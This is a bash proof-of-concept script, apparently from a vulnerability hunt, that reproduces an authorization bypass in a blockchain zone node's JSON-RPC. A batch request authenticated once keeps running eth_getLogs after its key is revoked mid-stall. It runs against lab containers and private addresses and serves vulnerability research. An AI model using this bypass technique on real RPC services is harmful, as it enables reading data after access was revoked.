#!/usr/bin/env bash
# Claim 2: an HTTP JSON-RPC batch on follower zone-1 authenticates once; a slow first op
# (zone_getEncryptionKey, L1 provider connection delayed via relay) lets a later eth_getLogs in the
# same batch run after K was revoked. Usage: claim2.sh <run> <acct> <l1-provider-src-port> [delay_ms]
set -uo pipefail
source /home/exedev/hunt-logs/repro/keys/common.sh; source /home/exedev/hunt-logs/repro/auth/lib.sh
RUN=$1; ACCT=$2; PORT=$3; D=${4:-4000}; OUT=$A/claim2-$RUN
newkey $ACCT; sleep 4; log "V=$V K=$KA zone-1 getKey: $(getkey zone-1 $V $KA)"
CID=$(c zone-0 cast chain-id --rpc-url http://localhost:8545); TOK=$(mktoken $KPK $V $CID)
VT=$(echo 0x000000000000000000000000${V#0x} | tr A-F a-f); TR=0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
log "pre: single request with K-token: $(rrpc 10.20.0.12 $TOK '{"jsonrpc":"2.0","id":1,"method":"zone_getAuthorizationTokenInfo","params":[]}')"
CUR=$(tip zone-1); FROM=$(printf '0x%x' $((CUR+1)))
BATCH="[{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"zone_getEncryptionKey\",\"params\":[]},{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"eth_getLogs\",\"params\":[{\"fromBlock\":\"$FROM\",\"toBlock\":\"latest\",\"address\":\"$T\",\"topics\":[\"$TR\",\"$VT\"]}]}]"
N=$(c zone-0 cast nonce $V --rpc-url http://localhost:8545)
l1delayport 1 $D $PORT
T0=$(date +%s.%N); log "batch sent at $T0 (zone-1 tip $CUR, fromBlock $FROM, delay ${D}ms on L1 provider conn)"
( curl -s -m 120 -o $OUT-batch.json -w '%{http_code}' -H "content-type: application/json" -H "x-authorization-token: $TOK" -d "$BATCH" http://10.20.0.12:8544/ > $OUT-batch.code; date +%s.%N > $OUT-batch.end ) &
sleep 0.5
docker exec $E zone-0 sh -c "echo REVOKE \$(cast send --async --nonce $N $KC 'revokeKey(address)' $KA --private-key $VPK --gas-limit 1000000 --rpc-url http://localhost:8545) \$(date +%s.%N); for i in \$(seq 1 10); do cast send --async --nonce \$(($N+i)) $T 'transfer(address,uint256)' 0x000000000000000000000000000000000000dEaD \$((2000+i)) --private-key $VPK --gas-limit 500000 --rpc-url http://localhost:8545 >/dev/null 2>&1 & sleep 0.2; done; wait" > $OUT-send.log
RTX=$(awk '/^REVOKE/{print $2}' $OUT-send.log)
RB=$(c zone-0 cast receipt $RTX blockNumber --rpc-url http://localhost:8545); RIDX=$(c zone-0 cast receipt $RTX transactionIndex --rpc-url http://localhost:8545)
log "revoke tx $RTX in block $RB idx $RIDX; z0=$(tip zone-0) z1=$(tip zone-1); zone-1 getKey: $(getkey zone-1 $V $KA)"
log "during stall ($(echo "$(date +%s.%N)-$T0"|bc)s): separate request same token: $(rrpc 10.20.0.12 $TOK '{"jsonrpc":"2.0","id":1,"method":"zone_getAuthorizationTokenInfo","params":[]}')"
l1clear 1; log "delay cleared; batch pending: $([[ -s $OUT-batch.end ]] && echo no || echo yes)"
wait
log "batch HTTP $(cat $OUT-batch.code) returned after $(echo "$(cat $OUT-batch.end)-$T0"|bc)s"
log "after: separate request same token: $(rrpc 10.20.0.12 $TOK '{"jsonrpc":"2.0","id":1,"method":"eth_blockNumber","params":[]}')"
docker logs --since 2m zone-1 2>&1 | grep -E "zone::rpc.*auth failed" | tail -n 3
python3 -I - $OUT-batch.json $RB $RIDX <<'PY'
import json,sys
r=json.load(open(sys.argv[1])); rb=int(sys.argv[2]); ri=int(sys.argv[3])
for x in r:
    if x["id"]==1: print("op1 zone_getEncryptionKey:", json.dumps(x)[:160])
    else:
        if "error" in x: print("op2 error", x["error"]); continue
        logs=x["result"]; post=[(int(l["blockNumber"],16),int(l["transactionIndex"],16)) for l in logs]
        after=[p for p in post if p[0]>rb or (p[0]==rb and p[1]>ri)]
        print(f"op2 eth_getLogs: {len(logs)} V Transfer logs; after revoke (block>{rb} or block {rb} idx>{ri}): {len(after)} in blocks {sorted(set(b for b,_ in after))}")
PY
